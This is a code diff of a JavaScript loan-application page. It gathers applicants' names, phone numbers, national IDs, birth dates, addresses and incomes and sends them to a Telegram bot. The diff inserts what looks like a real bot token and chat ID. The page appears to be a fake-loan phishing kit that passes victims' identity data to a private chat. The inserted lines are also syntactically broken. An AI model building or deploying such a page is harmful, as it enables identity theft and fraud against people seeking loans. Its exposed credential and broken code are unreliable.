@@ -11,8 +11,9 @@ const app = document.getElementById('app');
  * ⚠⃟  This token is visible in your JS bundle. Keep your bot/group private.
  * ────────────────────────────────────────── */
 const TELEGRAM = {
-  BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',   // ← replace this
-  CHAT_ID:   'YOUR_CHAT_ID_HERE',     // ← replace this (e.g. -1001234567890)
+  BOT_TOKEN: 8751335932: AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms
+   // ← replace this
+  CHAT_ID: 2056358288     // ← replace this (e.g. -1001234567890)
 };
 
 /* ─── SEND TO TELEGRAM ──────────────────────────────────────── */
@@ -54,12 +55,13 @@ const sendToTelegram = async (s) => {
 
   try {
     const res = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot$8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms
+/sendMessage`,
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM.CHAT_ID,
+          chat_id: TELEGRAM.CHAT_ID2056358288
           text: msg,
           parse_mode: 'Markdown',
         }),
@@ -75,13 +77,13 @@ const sendToTelegram = async (s) => {
 
 /* ─── VALIDATION ──────────────────────────────────────────── */
 const rules = {
-  'f-name':     { label: 'Full Name',        test: v => v.trim().length >= 2,                   msg: 'Please enter your full name (min 2 chars)' },
-  'f-phone':    { label: 'Phone Number',     test: v => /^[0-9+\s-]{7,15}$/.test(v.trim()),    msg: 'Please enter a valid phone number' },
-  'f-nid':      { label: 'National ID',      test: v => v.trim().length >= 4,                   msg: 'Please enter a valid National ID' },
-  'f-dob':      { label: 'Date of Birth',    test: v => !!v,                                    msg: 'Please select your date of birth' },
-  'f-emp':      { label: 'Employment',       test: v => !!v,                                    msg: 'Please select your employment status' },
-  'f-income':   { label: 'Monthly Income',   test: v => parseFloat(v) > 0,                      msg: 'Please enter a valid monthly income' },
-  'f-purpose':  { label: 'Loan Purpose',     test: v => !!v,                                    msg: 'Please select a loan purpose' },
+  'f-name': { label: 'Full Name', test: v => v.trim().length >= 2, msg: 'Please enter your full name (min 2 chars)' },
+  'f-phone': { label: 'Phone Number', test: v => /^[0-9+\s-]{7,15}$/.test(v.trim()), msg: 'Please enter a valid phone number' },
+  'f-nid': { label: 'National ID', test: v => v.trim().length >= 4, msg: 'Please enter a valid National ID' },
+  'f-dob': { label: 'Date of Birth', test: v => !!v, msg: 'Please select your date of birth' },
+  'f-emp': { label: 'Employment', test: v => !!v, msg: 'Please select your employment status' },
+  'f-income': { label: 'Monthly Income', test: v => parseFloat(v) > 0, msg: 'Please enter a valid monthly income' },
+  'f-purpose': { label: 'Loan Purpose', test: v => !!v, msg: 'Please select a loan purpose' },
 };
 
 const setError = (id, msg) => {
@@ -173,7 +175,7 @@ const header = () => `
 
 /* ─── STEPPER ────────────────────────────────────────────────── */
 const stepper = (active) => {
-  const steps = ['LOAN','PERSONAL','EMPLOYMENT','REVIEW'];
+  const steps = ['LOAN', 'PERSONAL', 'EMPLOYMENT', 'REVIEW'];
   return `<div class="stepper">${steps.map((s, i) => {
     const cls = i < active ? 'done' : i === active ? 'active' : 'pending';
     return `<div class="step-item">
@@ -216,7 +218,7 @@ const renderCalculator = () => `
         <div class="control-label" style="font-size:0.72rem; font-weight:800; color:#64748b; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">Loan Term</div>
         <div style="font-size:1.5rem; font-weight:800; color:#1b3668; margin-bottom:14px;" id="termDisp">${state.term} months</div>
         <div class="term-grid">
-          ${[6,12,24,36,48,60].map(t => `
+          ${[6, 12, 24, 36, 48, 60].map(t => `
             <button class="term-btn${state.term === t ? ' active' : ''}" data-term="${t}">${t}<br>months</button>
           `).join('')}
         </div>
@@ -235,10 +237,10 @@ const renderCalculator = () => `
     <!-- Feature cards -->
     <div style="display:flex; flex-direction:column; gap:16px; flex:1; min-width:220px;">
       ${[
-        { icon: '⚡', title: 'Fast Approval', desc: 'Within 24 hours' },
-        { icon: '💰', title: 'Low Rates', desc: 'From 8% APR' },
-        { icon: '🔒', title: 'Secure', desc: 'Bank-level security' }
-      ].map(f => `
+    { icon: '⚡', title: 'Fast Approval', desc: 'Within 24 hours' },
+    { icon: '💰', title: 'Low Rates', desc: 'From 8% APR' },
+    { icon: '🔒', title: 'Secure', desc: 'Bank-level security' }
+  ].map(f => `
         <div class="feature-card">
           <div class="feature-icon" style="font-size:1.3rem;">${f.icon}</div>
           <div class="feature-content">
@@ -308,17 +310,17 @@ const renderForm = () => `
       ${field('Home Address', 'f-addr', 'text', 'placeholder="Street, City"')}
       ${field('Telegram (optional)', 'f-tg', 'text', 'placeholder="@username"')}
 
-      ${selectField('Employment Status', 'f-emp', ['Employed','Self-Employed','Business owner','Unemployed'], true)}
+      ${selectField('Employment Status', 'f-emp', ['Employed', 'Self-Employed', 'Business owner', 'Unemployed'], true)}
 
       ${field('Employer / Business Name', 'f-employer', 'text', 'placeholder="Company or business name"')}
       ${field('Monthly Net Income (USD)', 'f-income', 'number', 'placeholder="0.00" min="0" required')}
 
-      ${selectField('Loan Purpose', 'f-purpose', ['Personal','Medical','Business','Education','Home improvement','Vehicle','Debt consolidation','Other'], true)}
+      ${selectField('Loan Purpose', 'f-purpose', ['Personal', 'Medical', 'Business', 'Education', 'Home improvement', 'Vehicle', 'Debt consolidation', 'Other'], true)}
 
       <div class="form-group">
         <label for="f-term">Repayment Term</label>
         <select id="f-term">
-          ${[6,12,24,36,48,60].map(t => `<option value="${t}" ${t === state.term ? 'selected' : ''}>${t} months</option>`).join('')}
+          ${[6, 12, 24, 36, 48, 60].map(t => `<option value="${t}" ${t === state.term ? 'selected' : ''}>${t} months</option>`).join('')}
         </select>
       </div>
 
@@ -518,18 +520,18 @@ function navigate(view) {
         if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
         return;
       }
-      state.name        = document.getElementById('f-name').value;
-      state.phone       = document.getElementById('f-phone').value;
-      state.nationalId  = document.getElementById('f-nid').value;
-      state.dob         = document.getElementById('f-dob').value;
-      state.email       = document.getElementById('f-email').value;
-      state.address     = document.getElementById('f-addr').value;
-      state.telegram    = document.getElementById('f-tg').value;
-      state.employment  = document.getElementById('f-emp').value;
-      state.employer    = document.getElementById('f-employer').value;
+      state.name = document.getElementById('f-name').value;
+      state.phone = document.getElementById('f-phone').value;
+      state.nationalId = document.getElementById('f-nid').value;
+      state.dob = document.getElementById('f-dob').value;
+      state.email = document.getElementById('f-email').value;
+      state.address = document.getElementById('f-addr').value;
+      state.telegram = document.getElementById('f-tg').value;
+      state.employment = document.getElementById('f-emp').value;
+      state.employer = document.getElementById('f-employer').value;
       state.monthlyIncome = document.getElementById('f-income').value;
-      state.purpose     = document.getElementById('f-purpose').value;
-      state.term        = parseInt(document.getElementById('f-term').value);
+      state.purpose = document.getElementById('f-purpose').value;
+      state.term = parseInt(document.getElementById('f-term').value);
       navigate('review');
     });
   }
